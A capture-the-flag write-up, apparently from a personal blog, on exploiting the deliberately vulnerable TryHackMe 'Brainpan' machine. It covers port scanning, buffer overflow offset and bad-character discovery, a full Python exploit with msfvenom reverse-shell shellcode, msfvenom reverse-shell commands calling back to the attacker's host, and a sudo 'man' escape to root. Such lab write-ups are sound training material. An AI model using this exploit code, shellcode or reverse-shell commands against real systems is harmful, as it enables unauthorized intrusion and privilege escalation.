---
title: Box - Brainpan1
published: true
---

Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine.

[https://tryhackme.com/room/brainpan](https://tryhackme.com/room/brainpan)

![0xskar](/assets/brainpan01.jpg)

* * *

## Task 1 - Deploy and compromise the machine 

> Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don't give up (or look at writeups), just try harder. 

##  Nmap Scan

| PORT | STATE | SERVICE | REASON |
|------|-------|---------|--------|
| 9999/tcp | open | abyss | syn-ack ttl 61 |
| 10000/tcp | open | snet-sensor-mgmt SimpleHTTPServer 0.6 (Python 2.7.3) | syn-ack ttl 61 |

* * * 

##  Port 9999

- brainpan program needs password to continue can connect to this with netcat

* * * 

##  Port 10000

- SimpleHTTPServer 0.6 (Python 2.7.3)
- ``gobuster dir -u http://10.10.100.24:10000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html,php,txt --no-error -t 100``
- in /bin we find brainpan.exe

* * * 

##  Buffer Overflow

- Open brainpan.exe in immunity and set working folder
- ``!mona config -set workingfolder c:\mona\%p``
- We can send through 5000 a's with our a.py ``print("A" *5000)``
- We have an EBP and EIP overwrite so we should be able to overflow the buffer and and ECX Shitstorm!?

![0xskar](/assets/brainpan02.png)

- Finding the offset
- ``msf-pattern_create -l 5000`` and send and note the EIP "35724134"

![0xskar](/assets/brainpan03.png)

- ``msf-pattern_offset -l 5000 -q 35724134``
- we have an exact match at offset 524
- Now we can edit our code to send payloads so we can find badchars.

```python
import socket
import sys

offset = 524
payload = b"A" * offset + b"B" * 4

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.send(payload + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- we control the EIP as its overwritten with our B's 42424242
- now we can find the badchars
- create bytearray in immunity ``!mona bytearray -b "\x00"`` and update our code with badchars variable

```shell
import socket
import sys

offset = 524
payload = b"A" * offset + b"B" * 4
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.send(payload + badchars + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- restart brainpan in immunity and run exploit again and note the address that ESP registers
- **0022F930**
- run memory comparison in mona ``!mona compare -f C:\mona\brainpan\bytearray.bin -a 0022F930``
- we dont seen to have any badchars the shellcode returns Unmodified...

- try to find jump point with our badchars
- ``!mona jmp -r esp -cpb "\x00``

![0xskar](/assets/brainpan04.png)

- 311712F3 Jump Point
- Convert to little endian ``\xf3\x12\x17\x31``
- Generate shellcode with badchars... since this is a linux machine try linux shellcode? and try on target?
- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f c``
- update target IP and little endian and shellcode and lets see what happens

```python
import socket
import sys

offset = 524
payload = b"A" * offset + b"\xf3\x12\x17\x31" + b"\x90" * 32
shellcode = (b"\xb8\xea\xb3\xa8\x25\xdb\xd9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
b"\x52\x83\xea\xfc\x31\x42\x0e\x03\xa8\xbd\x4a\xd0\xd0\x2a\x08"
b"\x1b\x28\xab\x6d\x95\xcd\x9a\xad\xc1\x86\x8d\x1d\x81\xca\x21"
b"\xd5\xc7\xfe\xb2\x9b\xcf\xf1\x73\x11\x36\x3c\x83\x0a\x0a\x5f"
b"\x07\x51\x5f\xbf\x36\x9a\x92\xbe\x7f\xc7\x5f\x92\x28\x83\xf2"
b"\x02\x5c\xd9\xce\xa9\x2e\xcf\x56\x4e\xe6\xee\x77\xc1\x7c\xa9"
b"\x57\xe0\x51\xc1\xd1\xfa\xb6\xec\xa8\x71\x0c\x9a\x2a\x53\x5c"
b"\x63\x80\x9a\x50\x96\xd8\xdb\x57\x49\xaf\x15\xa4\xf4\xa8\xe2"
b"\xd6\x22\x3c\xf0\x71\xa0\xe6\xdc\x80\x65\x70\x97\x8f\xc2\xf6"
b"\xff\x93\xd5\xdb\x74\xaf\x5e\xda\x5a\x39\x24\xf9\x7e\x61\xfe"
b"\x60\x27\xcf\x51\x9c\x37\xb0\x0e\x38\x3c\x5d\x5a\x31\x1f\x0a"
b"\xaf\x78\x9f\xca\xa7\x0b\xec\xf8\x68\xa0\x7a\xb1\xe1\x6e\x7d"
b"\xb6\xdb\xd7\x11\x49\xe4\x27\x38\x8e\xb0\x77\x52\x27\xb9\x13"
b"\xa2\xc8\x6c\xb3\xf2\x66\xdf\x74\xa2\xc6\x8f\x1c\xa8\xc8\xf0"
b"\x3d\xd3\x02\x99\xd4\x2e\xc5\xac\x2a\x4f\xf4\xd9\x28\xaf\xe7"
b"\x45\xa4\x49\x6d\x66\xe0\xc2\x1a\x1f\xa9\x98\xbb\xe0\x67\xe5"
b"\xfc\x6b\x84\x1a\xb2\x9b\xe1\x08\x23\x6c\xbc\x72\xe2\x73\x6a"
b"\x1a\x68\xe1\xf1\xda\xe7\x1a\xae\x8d\xa0\xed\xa7\x5b\x5d\x57"
b"\x1e\x79\x9c\x01\x59\x39\x7b\xf2\x64\xc0\x0e\x4e\x43\xd2\xd6"
b"\x4f\xcf\x86\x86\x19\x99\x70\x61\xf0\x6b\x2a\x3b\xaf\x25\xba"
b"\xba\x83\xf5\xbc\xc2\xc9\x83\x20\x72\xa4\xd5\x5f\xbb\x20\xd2"
b"\x18\xa1\xd0\x1d\xf3\x61\xf0\xff\xd1\x9f\x99\x59\xb0\x1d\xc4"
b"\x59\x6f\x61\xf1\xd9\x85\x1a\x06\xc1\xec\x1f\x42\x45\x1d\x52"
b"\xdb\x20\x21\xc1\xdc\x60")

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('10.10.77.70',9999))
      s.send(payload + shellcode + b'\r\n')
      print("Payload sent...")
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

* * * 

##   Answer the questions below

**Gain initial access**

![0xskar](/assets/brainpan05.png) 

**Escalate your privileges to root.**

- generate new linux shellcode and send
- ``msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.x.x.x LPORT=9999 -f c -a x86 --platform linux -b "\x00"``
- upgrade shell 

```shell
python -c 'import pty;pty.spawn("/bin/bash")' 
export TERM=xterm 
```

- sudo -l gives us ``/home/anansi/bin/anansi_util`` which lets us run man as sudo
- https://gtfobins.github.io/gtfobins/man/#sudo
- break out with a root shell!

![0xskar](/assets/brainpan07.png)

* * * 